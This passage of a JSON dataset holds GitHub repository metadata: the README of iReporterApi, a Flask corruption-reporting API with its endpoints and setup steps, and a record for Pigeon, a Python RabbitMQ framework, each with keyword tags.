    "description": "# iReporterApi iReporter is an application whose aim is to reduce corruption in Africa and foster economic development. It allows users to create red flags and interventions. It implents the following list of APIs.  ### Framework used The application is built using python: flask framework. >[Flask](http://flask.pocoo.org/) is a microframework for the Python programming language.   ### End points Method | Endpoint | Usage | | ---- | ---- | --------------- | |POST| `/api/v2/auth/signup` |  Register a user. | |POST| `api/v2/auth/login` | Login user.| |POST| `api/v2/auth/logout` | Logs out a user.| |POST| `api/v2/interventions` | Create a new incident. | |GET| `api/v2/interventions` | Get all the created incidents. | |GET| `api/v2/interventions/user` | Get all incident of the logged in user. | |GET| `api/v2/interventions/` | Get a single incident. | |PATCH| `api/v2/interventions//location` | Update a single incident location. | |PATCH| `api/v2/interventions//comment` | Update a single incident comment. | |PATCH| `api/v2/interventions//status` | Update a single incident status. | |DELETE| `api/v2/interventions/` | Delete a single incident. |  ## Installation 🕵 - To run on local machine git clone this project : ``` $ git clone https://github.com/larryTheGeek/iReporterApi.git ``` Copy and paste the above command in your terminal, the project will be downloaded to your local machine.  To Install python checkout: ``` https://www.python.org/ ```  - create a virtualenv and make it use python 3 using the following command. ``` $ virtualenv -p python3 env ``` - activate the virtual environment ```  $ source env/bin/activate ``` - Install Requirements ``` $ pip install -r requirements.txt ``` ### Testing - Run Test using pytest with the following command ``` $ py.test --cov=app test`  ``` you will get the test coverage report on your terminal   The app can also be tested via Postman - Run App  ``` $ python run.py ``` The app should be accessiable via : http://127.0.0.1:5000/  open postman and navigate to the API endpoints described above  ### HEROKU URL  https://ireporter-version2.herokuapp.com/api/v2/   ### Owner - Larry Karani  ### Motivation https://www.youtube.com/watch?v=wHRUDL7GKmI",
    "fork": false,
    "created_at": "2019-05-25T11:43:18Z",
    "updated_at": "2019-05-28T07:00:53Z",
    "stargazers_count": 0,
    "watchers_count": 0,
    "forks": 0,
    "watchers": 0,
    "score": 1,
    "owner_id": 22986772,
    "owner_login": "LarryKarani",
    "owner_avatar_url": "https://avatars1.githubusercontent.com/u/22986772?v=4",
    "pulled": 1,
    "tags": [
      "test",
      " postman",
      "create",
      "repo",
      "application",
      "http",
      "user",
      "develop",
      "sign",
      "environment",
      "auth",
      "endpoint",
      "points",
      "tested",
      "framework",
      "https",
      "endpoints",
      "load",
      "local",
      "list",
      "source",
      "built",
      "users",
      "stat",
      "version",
      "python",
      "development",
      "command",
      "access",
      "check",
      "program",
      "report",
      "github",
      "allows",
      "open",
      "lang",
      "micro",
      "install",
      "flask",
      "login",
      "clone",
      "desc",
      "download",
      "status",
      "require",
      "following",
      "machine",
      "reporter",
      "should",
      "single",
      "location",
      "terminal",
      "heroku",
      "language",
      "coverage",
      "signup",
      "programming",
      "pytest",
      "foster",
      "youtube",
      "ireporter"
    ]
  },
  {
    "id": 94663945,
    "name": "Pigeon",
    "full_name": "VictorDeon/Pigeon",
    "description": "Pigeon is a framework developed in python that was made to intermediate the use of RabbitMQ services in a quick and easy way, these services of communication between components / services through different types of context of exchange of messages",
    "fork": false,
    "created_at": "2017-06-18T04:01:36Z",
    "updated_at": "2018-07-22T06:04:56Z",
    "stargazers_count": 1,
    "watchers_count": 1,
    "forks": 0,
    "watchers": 1,
    "score": 1,
    "owner_id": 14116020,
    "owner_login": "VictorDeon",
    "owner_avatar_url": "https://avatars0.githubusercontent.com/u/14116020?v=4",
    "pulled": 1,
    "tags": [
      "service",
      "develop",
      "framework",
      "services",
      "rent",
      "python",
      "developed",
      "message",
      "text",
      "type",
      "between",
      "types",
      "messages",
      "component",
      "media",
      "communication",
      "components",
      "exchange"
    ]
  }
]